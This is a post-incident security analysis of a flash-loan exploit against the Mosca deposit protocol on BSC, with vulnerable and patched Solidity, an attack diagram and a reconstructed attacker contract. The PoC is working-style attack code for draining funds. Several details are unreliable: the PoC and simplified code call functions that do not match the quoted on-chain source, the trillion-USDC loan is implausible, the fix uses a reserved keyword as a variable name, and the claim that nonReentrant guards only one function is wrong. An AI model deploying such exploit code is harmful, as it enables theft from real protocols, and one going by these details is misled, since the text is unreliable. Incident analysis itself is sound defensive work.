# Mosca — Flash Loan-Based State Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2025-01-10 |
| **Protocol** | Mosca |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$19,000 |
| **Attacker** | [0xb7d7240c...](https://bscscan.com/address/0xb7d7240c207e094a9be802c0f370528a9c39fed5) |
| **Attack Tx** | [0x4e5bb7e3...](https://bscscan.com/tx/0x4e5bb7e3f552f5ee6ee97db9a9fcf07287aae9a1974e24999690855741121aff) |
| **Vulnerable Contract** | [0x1962b335...](https://bscscan.com/address/0x1962b3356122d6a56f978e112d14f5e23a25037d) |
| **Root Cause** | Lack of fund source validation and state management error during repeated join/exit calls, allowing flash loan funds to be treated as legitimate deposits and enabling excess withdrawals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Mosca_exp.sol) |

---

## 1. Vulnerability Overview

The Mosca protocol uses a `join()` function to deposit funds and `exit()` to withdraw them. The attacker borrowed 1 trillion USDC via a flash loan from PancakeSwap V3, called `join()`, then repeated the `exit()` withdrawal cycle 20 times. Because the protocol did not validate the source of funds, flash loan capital was treated as legitimate deposits. Through repeated cycles, state accumulated incorrectly, making it possible to withdraw more than the protocol actually held.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: join allowed without fund source validation
function join(uint256 amount) external {
    // Only records transferred amount — no flash loan check
    userBalance[msg.sender] += amount;
    totalDeposits += amount;
    IERC20(USDC).transferFrom(msg.sender, address(this), amount);
}

function exit() external {
    uint256 amount = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Withdrawal without state reset → totalDeposits mismatch across repeated cycles
    IERC20(USDC).transfer(msg.sender, amount);
}

// ✅ Safe code: reentrancy protection + fund source validation
function join(uint256 amount) external nonReentrant {
    require(amount > 0, "Zero amount");
    uint256 before = IERC20(USDC).balanceOf(address(this));
    IERC20(USDC).transferFrom(msg.sender, address(this), amount);
    uint256 actual = IERC20(USDC).balanceOf(address(this)) - before;
    userBalance[msg.sender] += actual; // Record actual amount received
    totalDeposits += actual;
}
```

### On-Chain Source Code

Source: **Sourcify-verified (partial)** — Mosca / 0x1962b3356122d6A56f978e112d14f5E23a25037D (BSC)
https://sourcify.dev/server/files/any/56/0x1962b3356122d6a56f978e112d14f5e23a25037d

> Note: The exploited path is `join()` → balance inflation via `cascade()` reward credits → `exitProgram()` → `withdrawAll()`. The `withdrawAll()` function pays out `balance + balanceUSDT + balanceUSDC` without validating those internal ledger entries against actual contract token holdings, and the referral cascade in `join()` credits arbitrary internal balances to attacker-controlled accounts.

```solidity
pragma solidity ^0.8.20;

contract Mosca is ReentrancyGuard {
    IERC20 public usdt;
    IERC20 public usdc;

    struct User {
        uint256 balance;      // internal Mosca-unit balance (not 1:1 with real tokens)
        uint256 balanceUSDT;
        uint256 balanceUSDC;
        uint256 nextDeadline;
        uint256 bonusDeadline;
        uint256 runningCount;
        uint256 inviteCount;
        uint256 refCode;
        uint256 collectiveCode;
        address walletAddress;
        bool enterprise;
    }

    mapping(address => User) public users;
    mapping(uint256 => address) public referrers;
    mapping(address => uint256) public refByAddr;

    uint256 public JOIN_FEE = 28 * 1e18;
    uint256 public TAX      =  3 * 1e18;

    // ❌ VULNERABLE: join() credits user.balance with baseAmount - JOIN_FEE
    // and then calls cascade() which credits MORE balance to up to 10 referrers —
    // all from internal ledger entries, not from real token inflows
    function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant {
        User storage user = users[msg.sender];
        uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;

        uint256 baseAmount = ((amount + diff) * 1000) / 1015;

        // ... (fee/tax transfers to contract and owner) ...
        require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), "Transfer failed");
        require(usdc.transferFrom(msg.sender, owner, TAX * 3), "Transfer failed");

        user.nextDeadline  = block.timestamp + 28 days;
        user.bonusDeadline = block.timestamp + 7 days;
        user.walletAddress = msg.sender;
        totalRevenue += amount;
        user.balance += baseAmount - JOIN_FEE; // ❌ credited from formula, not from token balance

        // ❌ cascade() additionally credits up to 10 referrer accounts in the MLM tree
        cascade(msg.sender);          // ❌ further inflates referrer.balance entries
        distributeFees(msg.sender, amount); // ❌ also credits referrer.balance via transfer fees
    }

    // ❌ cascade() mints virtual balance to referrers — no real token backing
    function cascade(address tempAddress) private {
        User storage user = users[tempAddress];
        address referrer = referrers[user.collectiveCode];
        uint256 depth = 0;
        while (referrer != address(0) && depth < 10) {
            if (users[referrer].inviteCount < 3 && depth >= 2) {
                depth++;
            } else {
                users[referrer].balance += (tierRewards[depth] * 10 ** 18) / 100; // ❌ pure ledger credit
                emit RewardEarned(referrer, block.timestamp, (tierRewards[depth] * 10 ** 18) / 100);
                depth++;
            }
            referrer = referrers[users[referrer].collectiveCode];
        }
    }

    // ❌ VULNERABLE: exitProgram() calls withdrawAll() which pays out the entire
    // inflated internal balance in real tokens without solvency validation
    function exitProgram() external nonReentrant {
        require(!isBlacklisted[msg.sender], "Blacklisted user");
        User storage user = users[msg.sender];
        // ... referrer inviteCount decrement ...
        for (uint256 i = 0; i < rewardQueue.length; i++) {
            if (rewardQueue[i] == msg.sender) {
                withdrawAll(msg.sender); // ❌ pays out balance + balanceUSDT + balanceUSDC
                // ... cleanup ...
                emit ExitProgram(msg.sender, block.timestamp);
            }
        }
    }

    // ❌ CORE VULNERABILITY: withdrawAll() pays out sum of all three balance fields
    // as real USDC/USDT without checking whether the contract actually holds enough tokens
    function withdrawAll(address addr) private {
        User storage user = users[addr];
        require(msg.sender == user.walletAddress, "Wallet addresses do not match");
        uint balance = user.balance + user.balanceUSDT + user.balanceUSDC; // ❌ inflated internal sum
        if (usdc.balanceOf(address(this)) >= balance) {
            usdc.transfer(user.walletAddress, balance); // ❌ real USDC paid out for virtual balance
            emit WithdrawAll(user.walletAddress, block.timestamp, balance, 2);
        } else {
            usdt.transfer(user.walletAddress, balance); // ❌ same for USDT
            emit WithdrawAll(user.walletAddress, block.timestamp, balance, 1);
        }
    }
}
```

**Why it is exploitable (identify the bug from the code):**

- `join()` calculates `baseAmount = (amount * 1000) / 1015` and credits `user.balance += baseAmount - JOIN_FEE`. This is an internal unit that does not correspond 1:1 to deposited tokens after the referral cascade inflates balances across the MLM tree.
- `cascade()` credits `tierRewards` entries (2.5 MOSCA-units per tier level per referrer) as pure ledger additions. With a self-referral chain where the attacker controls all accounts, these credits accumulate without any corresponding token inflow.
- `distributeFees()` further credits referrer balances with 50bps of each transaction as another pure ledger entry.
- `withdrawAll()` converts the inflated `balance + balanceUSDT + balanceUSDC` directly into real USDC or USDT transfers, with no solvency check — if the internal sum exceeds what was deposited, the protocol overpays.
- Repeated `join()` + `exitProgram()` cycles exploit the compounding: each cycle credits the cascade tree again before the ledger is zeroed, and `exitProgram` pays out the accumulated inflated total.

```solidity
// ✅ Fix: track actual deposited principal separately; cap withdrawals to it
mapping(address => uint256) public depositedPrincipal;

function join(uint256 amount, ...) external nonReentrant {
    // ... fee deductions ...
    uint256 netDeposit = amount - (TAX * 3);
    depositedPrincipal[msg.sender] += netDeposit; // ✅ track real inflow
    user.balance += baseAmount - JOIN_FEE;
    // ...
}

function withdrawAll(address addr) private {
    User storage user = users[addr];
    require(msg.sender == user.walletAddress, "Wallet addresses do not match");
    uint256 payable = depositedPrincipal[addr]; // ✅ only pay back what was actually deposited
    depositedPrincipal[addr] = 0;
    usdc.transfer(user.walletAddress, payable);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Call join() with 1,000 USDC (legitimate deposit)
  │
  ├─→ [2] Obtain 1 trillion USDC flash loan from PancakeSwap V3
  │
  ├─→ [3] Call join() 7 times with 1,000 each (using flash loan funds)
  │         └─ Protocol treats flash loan funds as legitimate deposits
  │
  ├─→ [4] Call exit() 2 times
  │         └─ Accumulated incorrect state enables excess withdrawal
  │
  ├─→ [5] Repeat join() + exit() cycle 20 times
  │         └─ Protocol balance decreases with each cycle
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] Secure ~$19,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract MoscaAttacker {
    address constant MOSCA = 0x1962b3356122d6a56f978e112d14f5e23a25037d;
    address constant USDC = /* USDC address */;

    function attack() external {
        // [1] Legitimate initial deposit
        IERC20(USDC).approve(MOSCA, type(uint256).max);
        IMosca(MOSCA).join(1000 * 1e6);

        // [2] PancakeSwap V3 flash loan (1 trillion USDC)
        IPancakeV3Pool(pool).flash(
            address(this), 0, 1_000_000_000_000 * 1e6, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [3] join() 7 times using flash loan funds
        for (uint256 i = 0; i < 7; i++) {
            IMosca(MOSCA).join(1000 * 1e6);
        }

        // [4] exit() 2 times (excess withdrawal)
        IMosca(MOSCA).exit();
        IMosca(MOSCA).exit();

        // [5] Repeat cycle 20 times
        for (uint256 i = 0; i < 20; i++) {
            IMosca(MOSCA).join(1000 * 1e6);
            IMosca(MOSCA).exit();
        }

        // [6] Repay flash loan
        IERC20(USDC).transfer(pool, loanAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Lack of fund source validation (repeated join/exit treats external funds as legitimate deposits) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan + repeated calls) |
| **DApp Category** | Deposit/Withdrawal Protocol |
| **Impact** | Potential full drainage of protocol funds |

## 6. Remediation Recommendations

1. **Reentrancy Protection**: Apply `ReentrancyGuard`'s `nonReentrant` modifier to all state-changing functions
2. **Flash Loan Detection**: Detect and block join-exit patterns within the same block/transaction
3. **Minimum Lock Period**: Add a condition preventing withdrawals for at least N blocks after deposit
4. **Balance Invariant Verification**: Verify `totalDeposits == sum(userBalances)` at the end of each transaction

## 7. Lessons Learned

- Deposit/withdrawal protocols can become extremely vulnerable when combined with flash loans; repeated calls within a single transaction is the core attack pattern.
- `nonReentrant` only prevents re-entry into the same function — cross-function call patterns such as join → exit must be defended against separately.
- Designs that allow deposits regardless of fund source (i.e., whether flash-loaned) violate protocol invariants.